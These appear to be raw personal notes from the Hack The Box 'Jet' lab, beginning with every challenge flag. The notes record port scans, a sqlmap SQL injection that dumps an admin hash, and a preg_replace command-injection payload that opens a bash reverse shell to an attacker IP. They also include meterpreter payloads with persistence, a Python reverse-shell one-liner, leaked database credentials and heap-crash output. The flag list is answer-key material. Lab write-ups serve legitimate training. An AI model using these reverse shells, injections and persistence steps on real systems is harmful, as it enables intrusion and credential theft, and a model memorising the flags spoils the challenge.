@ https://www.hackthebox.eu/home/careers/company/3
Connect JET{s4n1ty_ch3ck}
Digging in... JET{w3lc0me_4nd_h@v3_fun!}
Going Deeper JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}
Bypassing Authentication JET{sQl_1nj3ct1ons_4r3_fun!}
Command JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
Overflown JET{0v3rfL0w_f0r_73h_lulz}
Secret Message JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}
Elasticity JET{3sc4p3_s3qu3nc3s_4r3_fun}
Member Manager JET{h34p_f0r_73h_b4bi3z}
More Secrets JET{n3xt_t1m3_p1ck_65537}
Memo JET{7h47s_7h3_sp1r17}

Connect (:80)
Digging in... (dig/drill)
Going Deeper
Bypassing Authentication (sqli)
Command

Overflown
Secret Message
Elasticity (elasticsearch)
Member Manager (:5555)
More Secrets
Memo (:7777)

Nmap scan report for 10.13.37.10
Host is up (0.25s latency).
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)
|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)
53/tcp   open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp   open  http     nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx on Debian!
5555/tcp open  freeciv?
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions:
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|   NULL: ...
|   SMBProgNeg: ...
7777/tcp open  cbt?
| fingerprint-strings:
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe:
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|     Delete memo
|     Can't you read mate?
|   NULL:
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|_    Delete memo

@ http://10.13.37.10
JET{s4n1ty_ch3ck}
[dns] `dig` `drill` (`ldns`)
$ dig @10.13.37.10 -x 10.13.37.10
37.13.10.in-addr.arpa.	604800	IN	SOA	www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800
/etc/hosts:
10.13.37.10	securewebinc.jet
10.13.37.10	www.securewebinc.jet
@ http://www.securewebinc.jet
JET{w3lc0me_4nd_h@v3_fun!}
[x] $ gobuster -w directory-list-2.3-medium.txt -u http://www.securewebinc.jet
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://www.securewebinc.jet/
[+] Threads      : 10
[+] Wordlist     : ../directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/12/15 02:44:17 Starting gobuster
=====================================================
/img (Status: 301)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
@ http://www.securewebinc.jet/js/secure.js
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
function getStats() {
	$.ajax({
		url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",
		success: function(result) {
			$('#attacks').html(result)
		},
		error: function(result) {
			console.log(result);
		}
	});
}
getStats();
setInterval(function() {
	getStats();
}, 10000);
@ http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}
Authorized use only.
Wrong password for user admin
$ python -u sqlmap.py -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=password"
sqlmap identified the following injection point(s) with a total of 270 HTTP(s) requests:
---
Parameter: username (POST)
	Type: boolean-based blind
	Title: AND boolean-based blind - WHERE or HAVING clause
	Payload: username=admin' AND 2845=2845 AND 'CFFZ'='CFFZ&password=password
	Type: error-based
	Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	Payload: username=admin' AND (SELECT 1281 FROM(SELECT COUNT(*),CONCAT(0x71627a6a71,(SELECT (ELT(1281=1281,1))),0x7162707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'vczw'='vczw&password=password
	Type: AND/OR time-based blind
	Title: MySQL >= 5.0.12 AND time-based blind
	Payload: username=admin' AND SLEEP(5) AND 'MJVA'='MJVA&password=password
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
banner: "5.7.21-0ubuntu0.16.04.1"
current user: "jet@localhost"
current database: "jetadmin"
hostname: "jet"
current user is DBA: False
database management system users [1]:
[*] "jet"@"localhost"
$ python -u sqlmap.py -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=password" --dbs jetadmin --dump
Database: jetadmin
Table: users
[1 entry]
+----+----------+------------------------------------------------------------------+
| id | username | password                                                         |
+----+----------+------------------------------------------------------------------+
| 1  | admin    | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 |
+----+----------+------------------------------------------------------------------+
@ https://crackstation.net
97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084:Hackthesystem200
@ http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
JET{sQl_1nj3ct1ons_4r3_fun!}
$ curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" -d "username=admin&password=Hackthesystem200" -o /dev/null -D - | fgrep "Set-Cookie:" | head -1 | perl -ne 'print $1 if m?PHPSESSID=([0-9a-z]{26});?'
rthnfbkj45mu4bb96bg5pskab0
@ http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php
$ curl -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php" -H "Cookie: PHPSESSID=rthnfbkj45mu4bb96bg5pskab0" | w3m -dump -T text/html
$ SH="exec%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E13%2E14%2E8%2F4444%200%3E%261%27%22%29%3B"; curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php" -H "Cookie: PHPSESSID=rthnfbkj45mu4bb96bg5pskab0" -d "swearwords%5B%2Fmessage%2Fe%5D=${SH}&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=admin%40securewebinc.jet&subject=subject&message=%3Cp%3Emessage%3C%2Fp%3E&_wysihtml5_mode=1" -o /dev/null

$ ncat -klvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.13.37.10:34716.
bash: no job control in this shell
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ python -c "import pty; pty.spawn(\"/bin/bash\");"
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ export TERM=linux
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ export TERMINFO=/etc/terminfo
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat a_flag_is_here.txt
JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
www-data@jet:/$ uname -a
Linux jet 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
www-data@jet:/$ lsb_release -a
Description: Ubuntu 16.04.4 LTS
Codename: xenial
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat db.php
<?php
$servername = "localhost";
$username = "jet";
$password = "dcr46kdl6zsld68idtyufldro";
// Create connection
$conn = new mysqli($servername,$username,$password,"jetadmin");
// Check connection
if ($conn->connect_error) {
	die("Connection failed: ".$conn->connect_error);
}
/* User Creation
$username = "admin";
$password = "apasswordhere";
$hashPassword = password_hash($password,PASSWORD_BCRYPT);
$sql = "insert into users (username,password) value("".$username."","".$hashPassword."")";
$result = mysqli_query($conn,$sql);
if($result)
{
	echo "Registration successfully";
} */
/home:
-rwsr-xr-x 1 alex alex 9112 Dec 12  2017 leak
/home/tony:
-rw-r--r-- 1 root root  129 Dec 28  2017 key.bin.enc
drwxr-xr-x 2 root root 4096 Dec 28  2017 keys
-rw-r--r-- 1 root root 4768 Dec 28  2017 secret.enc
/home/tony/keys:
-rw-r--r-- 1 root root  451 Dec 28  2017 public.crt
www-data@jet:/home/tony$ cat .bash_history
openssl rsautl -decrypt -inkey keys/private.key -in key.bin.enc -out key.bin
openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -pass file:./key.bin
www-data@jet:/home$ file leak
leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
www-data@jet:/home$ ldd leak
	linux-vdso.so.1 =>  (0x00007ffd5ad76000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f945b2e5000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f945b6af000)
[x] $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.13.14.8 LPORT=4445 -f elf -o pwn
[x] $ msfconsole -nqx "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.13.14.8; set LPORT 4445; set ExitOnSession false; exploit -jz"
[x] meterpreter> run persistence -U -i 3 -r 10.13.14.8 -p 4445

$ PHPSESSID=$(curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" -d "username=admin&password=Hackthesystem200" -o /dev/null -D - | fgrep "Set-Cookie:" | head -1 | perl -ne 'print $1 if m?PHPSESSID=([0-9a-z]{26});?'); IP="10%2e13%2e14%2e8"; PORT=4444; SH="exec%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F${IP}%2F${PORT}%200%3E%261%27%22%29%3B"; curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php" -H "Cookie: PHPSESSID=${PHPSESSID}" -d "swearwords%5B%2Fmessage%2Fe%5D=${SH}&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=admin%40securewebinc.jet&subject=subject&message=%3Cp%3Emessage%3C%2Fp%3E&_wysihtml5_mode=1" -o /dev/null
$ python -c "import pty; pty.spawn(\"/bin/bash\");"
$ export TERM=linux; export TERMINFO=/etc/terminfo
$ python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.13.14.8\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"

/home/alex/encrypted.txt xor-key:securewebincrocks
/home/alex/exploitme.zip passwd:securewebincrocks

$ ncat 10.13.37.10 5555
enter your name: name
Member manager!
1. add
2. edit
3. ban
4. change name
5. get gift
6. exit
5
your gift:
140207307522640

$ ncat 10.13.37.10 7777
--==[[ Spiritual Memo ]]==--
[1] Create a memo
[2] Show memo
[3] Delete memo
[4] Tap out
> 2
Data: 31ed4989d15e4889e24883e4f0505449c7c0900e40
> 3
*** Error in `/home/memo/memo': free(): invalid pointer: 0x0000000000400870 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fd8b32907e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fd8b329937a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fd8b329d53c]
/home/memo/memo[0x400c98]
/home/memo/memo[0x400d26]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fd8b3239830]
/home/memo/memo[0x400899]
======= Memory map: ========
00400000-00402000 r-xp 00000000 fc:00 805671            /home/memo/memo
00601000-00602000 r--p 00001000 fc:00 805671            /home/memo/memo
00602000-00603000 rw-p 00002000 fc:00 805671            /home/memo/memo
7fd8ac000000-7fd8ac021000 rw-p 00000000 00:00 0
7fd8ac021000-7fd8b0000000 ---p 00000000 00:00 0
7fd8b3003000-7fd8b3019000 r-xp 00000000 fc:00 1311245   /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd8b3019000-7fd8b3218000 ---p 00016000 fc:00 1311245   /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd8b3218000-7fd8b3219000 rw-p 00015000 fc:00 1311245   /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd8b3219000-7fd8b33d9000 r-xp 00000000 fc:00 1311406   /lib/x86_64-linux-gnu/libc-2.23.so
7fd8b33d9000-7fd8b35d9000 ---p 001c0000 fc:00 1311406   /lib/x86_64-linux-gnu/libc-2.23.so
7fd8b35d9000-7fd8b35dd000 r--p 001c0000 fc:00 1311406   /lib/x86_64-linux-gnu/libc-2.23.so
7fd8b35dd000-7fd8b35df000 rw-p 001c4000 fc:00 1311406   /lib/x86_64-linux-gnu/libc-2.23.so
7fd8b35df000-7fd8b35e3000 rw-p 00000000 00:00 0
7fd8b35e3000-7fd8b3609000 r-xp 00000000 fc:00 1311404   /lib/x86_64-linux-gnu/ld-2.23.so
7fd8b37fc000-7fd8b37ff000 rw-p 00000000 00:00 0
7fd8b3807000-7fd8b3808000 rw-p 00000000 00:00 0
7fd8b3808000-7fd8b3809000 r--p 00025000 fc:00 1311404   /lib/x86_64-linux-gnu/ld-2.23.so
7fd8b3809000-7fd8b380a000 rw-p 00026000 fc:00 1311404   /lib/x86_64-linux-gnu/ld-2.23.so
7fd8b380a000-7fd8b380b000 rw-p 00000000 00:00 0
7fffdca8e000-7fffdcaaf000 rw-p 00000000 00:00 0         [stack]
7fffdcb1e000-7fffdcb21000 r--p 00000000 00:00 0         [vvar]
7fffdcb21000-7fffdcb23000 r-xp 00000000 00:00 0         [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
